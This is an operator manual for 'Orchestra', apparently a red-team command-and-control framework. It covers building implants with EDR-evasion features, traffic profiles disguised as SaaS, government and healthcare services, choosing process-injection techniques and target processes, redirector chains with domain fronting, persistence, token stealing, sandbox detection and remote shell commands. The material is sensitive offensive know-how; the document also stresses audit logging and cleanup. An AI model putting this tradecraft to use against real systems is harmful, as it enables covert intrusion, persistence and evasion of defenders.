# Operator Manual

Advanced manual for Orchestra operators: profile management, technique selection, redirector chains, multi-operator workflows, audit log review, hot-reload, troubleshooting, and operational tradecraft.

---

## Overview

This manual covers day-to-day operational use of the Orchestra platform after deployment. It assumes you have already:
- Deployed an Orchestra server
- Built at least one agent
- Configured at least one malleable profile
- (Optional) Deployed redirectors

---

## 1. Server Management

### Starting the Server

```bash
# Development (foreground)
orchestra-server --config orchestra-server.toml

# Production (systemd)
systemctl start orchestra-server

# With custom config
orchestra-server --config /etc/orchestra/production.toml
```

### Server Configuration (`orchestra-server.toml`)

```toml
[server]
bind_addr = "0.0.0.0:8443"
admin_token = "admin-secret-token-here"
agent_shared_secret = "agent-psk-here"
tls_cert = "certs/server.crt"
tls_key = "certs/server.key"
audit_log = "audit.jsonl"
profile_dir = "profiles/"
build_dir = "builds/"
max_agents = 1000
heartbeat_timeout_secs = 300
```

### Server CLI

```
orchestra-server [OPTIONS]

Options:
  --config <PATH>              Configuration file path
  --validate-profile <PATH>    Validate a profile TOML file
  --generate-token <ROLE>      Generate auth token (admin, operator, redirector)
  --export-audit <PATH>        Export audit log to JSON
  --list-profiles              List loaded profiles
  --version                    Show version
  -h, --help                   Show help
```

---

## 2. Agent Building

### Building an Agent

```bash
# Build with default profile
orchestra-server build --profile default

# Build with specific features
orchestra-server build --profile linkedin --features "http-transport,memory-guard,direct-syscalls"

# Build for specific target
orchestra-server build --profile linkedin --target x86_64-pc-windows-gnu

# Build with custom output
orchestra-server build --profile linkedin --output /tmp/agent.exe
```

### Agent Feature Flags

Select features based on the operational environment:

| Feature | Use When | Avoid When |
|---------|----------|------------|
| `http-transport` | Standard C2 over HTTPS | Using DNS or SMB only |
| `doh-transport` | DNS-based C2 needed | HTTP is sufficient |
| `ssh-transport` | SSH tunnel C2 | No SSH infrastructure |
| `smb-pipe-transport` | P2P SMB relay | No Windows targets |
| `outbound-c` | Target has strict egress | Normal networks |
| `p2p-tcp` | P2P mesh networking | Single-agent operations |
| `direct-syscalls` | EDR evasion needed | No EDR present |
| `memory-guard` | Memory scanning risk | Low OPSEC environment |
| `self-reencode` | Signature-based detection | No AV/EDR |
| `network-discovery` | Network enumeration needed | Stealth-only ops |
| `persistence` | Long-term access needed | Short engagement |
| `remote-assist` | GUI interaction needed | Headless targets |
| `hci-research` | HCI telemetry capture | Not doing HCI research |
| `hot-reload` | Runtime config changes needed | Stable configuration |

### Feature Combinations by Scenario

**Standard Engagement:**
```bash
--features "http-transport,memory-guard,direct-syscalls,self-reencode"
```

**High-Stealth EDR Environment:**
```bash
--features "http-transport,memory-guard,direct-syscalls,self-reencode,p2p-tcp"
```

**DNS-Only Covert:**
```bash
--features "doh-transport,memory-guard,direct-syscalls"
```

**Pivot/Lateral Movement:**
```bash
--features "http-transport,smb-pipe-transport,p2p-tcp,network-discovery"
```

**Full-Featured:**
```bash
--features "http-transport,doh-transport,ssh-transport,smb-pipe-transport,p2p-tcp,direct-syscalls,memory-guard,self-reencode,network-discovery,persistence,remote-assist,hot-reload"
```

---

## 3. Malleable Profile Management

### Creating a New Profile

1. Create a new TOML file in the `profiles/` directory:

```bash
cp profiles/default.toml profiles/my-operation.toml
```

2. Edit the profile:

```toml
[profile]
name = "my-operation"
author = "operator-1"
description = "Custom profile for Operation X"

[global]
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
jitter = 37
sleep_time = 45

[http_get]
uri = ["/api/v2/notifications", "/api/v2/feed"]
verb = "GET"

[http_get.headers]
Accept = "application/json"
Connection = "keep-alive"

[http_get.metadata]
delivery = "Cookie"
key = "session_token"
transform = "Base64"

[http_get.client]
prepend = "JSESSIONID="
append = ";"
transform = "Base64"

[http_post]
uri = ["/api/v2/events", "/api/v2/analytics"]
verb = "POST"

[http_post.headers]
Content-Type = "application/json"
Accept = "application/json"

[http_post.output]
delivery = "Body"
transform = "Base64"
```

3. Validate the profile:

```bash
orchestra-server validate-profile --path profiles/my-operation.toml
```

4. Hot-reload (server picks up changes automatically):

```bash
# Server watches the profiles/ directory
# Just save the file - no restart needed
```

### Profile Selection Matrix

Choose a profile that matches the target's network environment:

| Target Environment | Recommended Profile | Key Characteristics |
|--------------------|--------------------|--------------------|
| Enterprise corporate | LinkedIn, Microsoft Teams | Common SaaS traffic |
| Cloud-heavy org | CloudFront, AWS API | CDN/API traffic |
| Government | Custom (.gov mimicry) | Matching government services |
| Tech company | GitHub, Slack API | Developer tool traffic |
| Healthcare | Epic, Cerner API | Healthcare IT traffic |
| Financial | Bloomberg, Reuters | Financial platform traffic |

---

## 4. Injection Technique Selection

### Decision Matrix

| Scenario | Recommended Technique | Reason |
|----------|----------------------|--------|
| Standard injection | Process Hollowing | Reliable, well-tested |
| EDR with memory scanning | Module Stomping | Blends with loaded modules |
| Suspended process target | Early Bird APC | Fires before main thread |
| Strict thread monitoring | ThreadPool Injection | No thread creation |
| Maximum stealth | Fiber Injection | User-mode scheduling |
| Avoiding new threads | Thread Hijacking | Reuses existing thread |

### Selecting a Target Process

Choose a target process that:

1. **Is always running** — `explorer.exe`, `svchost.exe`, `RuntimeBroker.exe`
2. **Matches the architecture** — x64 agent → x64 target process
3. **Has network access** — Browsers, updaters, system services
4. **Is not heavily monitored** — Avoid EDR-owned processes

| Good Targets | Avoid |
|-------------|-------|
| `explorer.exe` | `csrss.exe` (protected) |
| `svchost.exe` (network service) | `lsass.exe` (heavily monitored) |
| `RuntimeBroker.exe` | EDR service processes |
| `taskhostw.exe` | Antivirus processes |
| `SearchHost.exe` | Virtualization processes |

---

## 5. Redirector Chain Management

### Single Redirector

Simplest setup — one redirector between agent and C2:

```
Agent → Redirector → C2
```

### Multi-Redirector Chain

For high-value targets, chain multiple redirectors:

```
Agent → Redirector #1 (VPS) → Redirector #2 (VPS) → C2
```

Configure in the agent's profile:

```toml
# In the build profile
[[redirectors]]
address = "rd1.example.com:443"
priority = 1
weight = 70

[[redirectors]]
address = "rd2.example.com:443"
priority = 2
weight = 30
```

### CDN + Redirector

Combine CDN domain fronting with a redirector:

```
Agent → CDN Edge → Redirector → C2
```

The CDN masks the redirector's IP from the target network.

### Redirector Health Monitoring

Check redirector status from the server:

```bash
# List all registered redirectors
orchestra-server list-redirectors

# Output:
# ID         Address              Profile   Status   Uptime     Errors
# rd-uuid-1  rd1.example.com:443  linkedin  Healthy  7d 12h     0
# rd-uuid-2  rd2.example.com:443  linkedin  Degraded 2d 4h      15
```

---

## 6. Multi-Operator Workflows

### Operator Tokens

Each operator should have their own token:

```bash
# Generate operator token
orchestra-server generate-token --role operator
# Output: op_abc123def456...

# Token includes operator ID for audit trail
```

### Task Attribution

Every `TaskRequest` includes an `operator_id` that is:
- Automatically set from the authentication token
- Recorded in the audit log
- Visible to other operators in the dashboard

### Concurrent Operations

The server supports multiple operators simultaneously:

- **Task queuing** — Commands are queued per agent
- **Exclusive commands** — Shell sessions lock to one operator
- **File locking** — File writes are serialized
- **Visibility** — All operators see active tasks and results

---

## 7. Audit Log Review

### Audit Log Format

Each line in the JSONL audit log:

```json
{
  "timestamp": 1705312200,
  "agent_id": "DESKTOP-WIN10",
  "operator_id": "op-alice",
  "action": "ReadFile",
  "details": "Read /etc/hosts (256 bytes)",
  "outcome": "Success",
  "hmac": "sha256:abc123..."
}
```

### Reviewing Audit Logs

```bash
# Export audit log
orchestra-server export-audit --output audit-export.jsonl

# Search for specific actions
cat audit-export.jsonl | jq 'select(.action == "StartShell")'

# Search for specific operator
cat audit-export.jsonl | jq 'select(.operator_id == "op-alice")'

# Find failures
cat audit-export.jsonl | jq 'select(.outcome == "Failure")'

# Count actions per agent
cat audit-export.jsonl | jq '.agent_id' | sort | uniq -c | sort -rn
```

### Tamper Detection

Each audit entry is HMAC-signed. To verify:

```bash
orchestra-server verify-audit --path audit.jsonl
# Output: 10,000 entries verified, 0 tampered
```

---

## 8. Hot-Reload

### Profile Hot-Reload

The server watches the `profiles/` directory for changes:

1. **New file** → Profile is loaded and available for new builds
2. **Modified file** → Profile is reloaded (active agents keep their build-time profile)
3. **Deleted file** → Profile is removed (existing builds continue to work)

### Agent Config Hot-Reload

Send `ReloadConfig` command to an agent:

```bash
# Via the operator console
orchestra-console --server https://c2:8443 --token $TOKEN \
  send --agent DESKTOP-WIN10 --command ReloadConfig
```

The agent re-reads its configuration file without restarting.

### Module Hot-Reload

Upload new plugin versions without agent restart:

```bash
# Upload new plugin version
orchestra-server upload-module --name scanner --version 2.0.0 --file scanner.dll

# Tell agent to download new version
orchestra-console send --agent DESKTOP-WIN10 --command DownloadModule --args "scanner"
```

---

## 9. P2P Mesh Operations

### Establishing Links

```bash
# Link agent A (parent) to agent B (child)
# Send from the server to agent A:
orchestra-console send --agent DESKTOP-WIN10 --command LinkTo --args "10.0.0.20:4443"

# View topology
orchestra-console send --agent DESKTOP-WIN10 --command ListTopology
```

### Mesh Topology

```
Server
  └── DESKTOP-WIN10 (parent, internet-facing)
        ├── 10.0.0.20:4443 (child, internal network)
        │     └── 10.0.0.30:4443 (grandchild)
        └── 10.0.0.40:4443 (child)
```

### Mesh Routing

- Messages are routed through parent agents
- Each parent maintains a routing table of child `link_id`s
- Latency increases with depth (add ~50ms per hop)
- Bandwidth is limited by the slowest link in the chain

---

## 10. Persistence Management

### Enabling Persistence

```bash
# Enable persistence on an agent
orchestra-console send --agent DESKTOP-WIN10 --command EnablePersistence
```

### Platform-Specific Behavior

| Platform | Method | Notes |
|----------|--------|-------|
| Windows | Registry Run key | Survives reboots, visible in `regedit` |
| Windows | COM Hijack | More stealthy, requires COM knowledge |
| Windows | WMI Subscription | Persistent, harder to detect |
| Linux | cron | `@reboot` entry, visible in `crontab -l` |
| Linux | systemd | User service unit, visible in `systemctl` |
| macOS | LaunchAgent | `.plist` in `~/Library/LaunchAgents/` |

### Disabling Persistence

```bash
# Remove all persistence mechanisms
orchestra-console send --agent DESKTOP-WIN10 --command DisablePersistence
```

Always disable persistence at the end of an engagement.

---

## 11. Troubleshooting

### Agent Not Beacons

1. **Check network connectivity**:
   ```bash
   # From the agent's host
   curl -vk https://c2-server:8443/health
   ```

2. **Check profile match**: Agent and server must use the same profile name

3. **Check TLS**: Certificate must be valid or pinned correctly

4. **Check sleep timer**: Agent may be sleeping (wait for the configured interval)

5. **Check sandbox detection**: Agent may have detected a sandbox and exited silently

### Agent Exits After Start

1. **Environment check failure**: Agent detected sandbox/VM/debugger
   - Review env_check configuration
   - Disable specific checks for testing: `ORCHESTRA_SKIP_SANDBOX=1`

2. **Domain mismatch**: Agent detected it's not on the expected domain
   - Check `env_check.domain_suffix` in agent config

3. **Debugger detection**: Agent detected a debugger
   - Remove debuggers or disable check for testing

### Task Execution Fails

1. **Permission denied**: Agent process lacks permissions
   - Check integrity level
   - Consider `MakeToken` or `StealToken` for elevation

2. **Path not allowed**: File operation outside `allowed_paths`
   - Update agent config `allowed_paths`
   - Use `ReloadConfig` to apply changes

3. **Timeout**: Command execution exceeded time limit
   - Increase timeout in server configuration
   - Check if command is waiting for input

### Module Loading Fails

1. **Signature mismatch**: Module was not signed with the correct key
   - Re-sign the module: `keygen sign --key signing.key --module plugin.dll`
   - Verify signature: `keygen verify --pubkey signing.pub --module plugin.dll`

2. **Architecture mismatch**: Module is x86 but agent is x64
   - Build module for the correct architecture

3. **Missing dependencies**: Module depends on unavailable libraries
   - Ensure all dependencies are statically linked or available

### Redirector Not Forwarding

1. **Profile URI mismatch**: Agent's request URI doesn't match profile patterns
   - Verify agent was built with the correct profile
   - Check URI patterns in the redirector's profile

2. **C2 unreachable**: Redirector can't reach C2 server
   - Test connectivity: `curl -k https://c2-server:8443/health`
   - Check firewall rules between redirector and C2

3. **TLS failure**: Certificate issues between redirector and C2
   - Verify redirector trusts the C2's CA
   - Check certificate expiration

---

## 12. Operational Tradecraft

### Communication Discipline

1. **Use appropriate sleep timers**: Match the target's network traffic patterns
   - Business hours: 30–60s
   - After hours: 300–600s
   - High OPSEC: 600–3600s

2. **Use jitter**: Always set jitter to 20–40% to avoid periodic beaconing patterns

3. **Use working hours**: Configure agents to only beacon during business hours

4. **Rotate profiles**: Change malleable profiles periodically during long engagements

### Injection Discipline

1. **Inject into appropriate processes**: Match the target's software landscape
2. **Avoid double injection**: Check if a process is already injected
3. **Clean up**: Unload modules and revert changes when done
4. **Monitor for detection**: Watch for agent disconnections that may indicate EDR detection

### Infrastructure Discipline

1. **Rotate redirectors**: Change redirector IPs periodically
2. **Monitor health**: Watch redirector error rates
3. **Separate infrastructure**: Don't reuse IPs/domains between operations
4. **Cleanup**: Remove all infrastructure after the engagement

### Audit Discipline

1. **Review audit logs daily**: Check for unexpected commands or failures
2. **Attribute all actions**: Ensure each operator uses their own token
3. **Export logs regularly**: Maintain off-server copies of audit logs
4. **Verify integrity**: Run `verify-audit` periodically to detect tampering

---

## 13. Console CLI Reference

### `orchestra-console`

```
Usage: orchestra-console [OPTIONS] <COMMAND>

Commands:
  send        Send a command to an agent
  list        List connected agents
  jobs        List active jobs
  modules     List loaded modules
  profiles    List available profiles
  redirectors List registered redirectors
  audit       Query audit log
  build       Request an agent build

Options:
  --server <URL>       Orchestra server URL
  --token <TOKEN>      Authentication token
  --output <FORMAT>    Output format: text, json (default: text)
  -h, --help           Show help
```

### Send Command Examples

```bash
# Ping an agent
orchestra-console send --agent DESKTOP-WIN10 --command Ping

# Execute an approved script
orchestra-console send --agent DESKTOP-WIN10 --command RunApprovedScript --args "backup-check"

# Read a file
orchestra-console send --agent DESKTOP-WIN10 --command ReadFile --args "/etc/hosts"

# Start a shell
orchestra-console send --agent DESKTOP-WIN10 --command StartShell
# Returns: session_id

# Send shell input
orchestra-console send --agent DESKTOP-WIN10 --command ShellInput --args '{"session_id":"abc","data":"whoami\n"}'

# Get shell output
orchestra-console send --agent DESKTOP-WIN10 --command ShellOutput --args '{"session_id":"abc"}'

# List processes
orchestra-console send --agent DESKTOP-WIN10 --command ListProcesses

# Capture screenshot
orchestra-console send --agent DESKTOP-WIN10 --command CaptureScreen

# Discover network
orchestra-console send --agent DESKTOP-WIN10 --command DiscoverNetwork

# Enable persistence
orchestra-console send --agent DESKTOP-WIN10 --command EnablePersistence

# Shutdown agent
orchestra-console send --agent DESKTOP-WIN10 --command Shutdown
```

---

## 14. Emergency Procedures

### Agent Self-Destruct

If an agent is detected or compromised:

```bash
orchestra-console send --agent DESKTOP-WIN10 --command Shutdown
```

The agent will:
1. Disable persistence
2. Unload all modules
3. Zero all memory regions
4. Terminate cleanly

### Server Emergency Shutdown

```bash
# Graceful shutdown (notifies agents)
kill -SIGTERM $(pidof orchestra-server)

# Immediate shutdown (use with caution)
kill -SIGKILL $(pidof orchestra-server)
```

### Audit Log Preservation

Before any emergency action:

```bash
# Immediately export audit logs
orchestra-server export-audit --output /secure/location/audit-$(date +%Y%m%d-%H%M%S).jsonl
```

---

## See Also

- [MALLEABLE_PROFILES.md](MALLEABLE_PROFILES.md) — Complete profile reference
- [INJECTION_ENGINE.md](INJECTION_ENGINE.md) — Injection techniques
- [SLEEP_OBFUSCATION.md](SLEEP_OBFUSCATION.md) — Sleep obfuscation pipeline
- [REDIRECTOR_GUIDE.md](REDIRECTOR_GUIDE.md) — Redirector deployment
- [ARCHITECTURE.md](ARCHITECTURE.md) — Internal architecture
- [SECURITY.md](SECURITY.md) — Security considerations
- [QUICKSTART.md](QUICKSTART.md) — Getting started guide
